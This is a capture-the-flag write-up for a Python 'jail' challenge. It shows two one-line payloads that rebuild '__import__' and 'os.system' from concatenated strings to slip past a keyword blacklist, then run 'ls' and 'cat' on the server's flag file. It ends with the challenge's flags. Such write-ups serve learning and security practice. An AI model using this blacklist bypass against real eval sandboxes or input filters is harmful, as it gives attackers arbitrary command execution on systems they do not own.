# Jail

There were 2 similar challenges because for the first one the blacklist did not work as intended.
But my script solved both of them, just the name of the flag file is different

## Analysis
Typical jailbreak challenge. We are provided with a server that evaluates whatever
Python code we give it, BUT we are forbidden to use certain word (see blacklist.txt).
That means we can't use import, os, cat, ls or other useful things... or can we?

Python gives us a lot of freedom in our code, which is not always a good thing.
How can we import something without using `import`? I'll give the final script
and explain it:

```py
getattr(getattr(globals()['__built'+'ins__'],'__im'+'port__')('o'+'s'),'sy'+'stem')('l'+'s')
getattr(getattr(globals()['__built'+'ins__'],'__im'+'port__')('o'+'s'),'sy'+'stem')('c'+'at'+chr(32)+'b49ddf352c9d2cdf7b9cf26dfeff15ad5336944e772b9d0190095be946fe8af9.txt')
```

We can't use `builtins`, but we can abuse the `globals` object and subscript
it with a concatenated string. Same thing goes with `import`. After we have access
to the `__import__` function, we can import `os` (or `'o' + 's'`, lol) and run whatever
commands we want using string concatenation

Final flags:

`kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}`

`kqctf{0h_h0w_1_w4n7_70_br34k_fr33_2398d89vj3nsoicifh3bdoq1b39049v}`